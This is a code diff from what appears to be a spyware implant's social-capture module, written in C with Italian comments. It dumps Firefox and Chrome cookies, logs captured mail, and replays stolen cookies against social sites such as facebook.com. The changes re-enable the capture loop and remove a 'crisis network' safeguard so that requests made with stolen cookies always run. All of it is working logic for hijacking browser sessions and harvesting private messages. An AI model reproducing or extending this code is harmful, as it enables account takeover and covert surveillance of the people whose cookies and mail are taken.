@@ -128,9 +128,9 @@ void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is
 	additional_header.Program = program;
 	additional_header.VersionFlags = MAPI_V3_0_PROTO;
 
-	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
-	Log_WriteFile(hf, (BYTE *)raw_mail, additional_header.Size);
-	Log_CloseFile(hf); 
+	hf = Log_CreateFile2(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header), is_incoming);
+	Log_WriteFile2(hf, (BYTE *)raw_mail, additional_header.Size);
+	Log_CloseFile2(hf); 
 
 	return;
 }
@@ -187,12 +187,12 @@ void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *au
 void DumpNewCookies()
 {
 	ResetNewCookie();
-	DumpIECookies(L"Microsoft\\Windows\\Cookies");
-	DumpIECookies(L"Microsoft\\Windows\\Cookies\\Low");
-	DumpIECookies(L"..\\Local\\Microsoft\\Windows\\InetCookies");
-	DumpIECookies(L"..\\Local\\Microsoft\\Windows\\InetCookies\\Low");
-
-	DumpFFCookies();
+// 	DumpIECookies(L"Microsoft\\Windows\\Cookies");
+// 	DumpIECookies(L"Microsoft\\Windows\\Cookies\\Low");
+// 	DumpIECookies(L"..\\Local\\Microsoft\\Windows\\InetCookies");
+// 	DumpIECookies(L"..\\Local\\Microsoft\\Windows\\InetCookies\\Low");
+// 
+ 	DumpFFCookies();
 	DumpCHCookies();
 }
 
@@ -241,21 +241,24 @@ void SocialMainLoop()
 	DWORD i, ret;
 	char *str;
 
-	MessageBoxA(0, 0, 0, 0);
+	//MessageBoxA(0, 0, 0, 0);
 	InitSocialEntries();
 	SocialWinHttpSetup(L"http://www.facebook.com");
 	LOG_InitSequentialLogs();
-
+	static int itry = 0;
 	for (;;) {
 		// Busy wait...
-// 		for (int j=0; j<SLEEP_COOKIE; j++) {
-// 			if (!is_demo_version)
-// 				Sleep(1000);
-// 			else
-// 				Sleep(40);
-// 			CheckProcessStatus();
-// 		}
-
+		for (int j=0; j<SLEEP_COOKIE; j++) {
+			if (!is_demo_version)
+				Sleep(1000);
+			else
+				Sleep(40);
+			CheckProcessStatus();
+		}
+// 		Sleep(3000);
+// 		itry++;
+// 		if (itry>3)
+// 			break;
 		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
 // 		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted)
 // 			continue;
@@ -286,10 +289,10 @@ void SocialMainLoop()
 				CheckProcessStatus();
 				_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);		
  				if (str = GetCookieString(domain_a)) {
-// 					if (!IsCrisisNetwork() && social_entry[i].RequestHandler)
-// 						ret = social_entry[i].RequestHandler(str);
-// 					 else
-// 						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
+					if (social_entry[i].RequestHandler)// !IsCrisisNetwork() && , rem by fhc
+						ret = social_entry[i].RequestHandler(str);
+					 else
+						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
 					SAFE_FREE(str);
 
 					if (ret == SOCIAL_REQUEST_SUCCESS) {
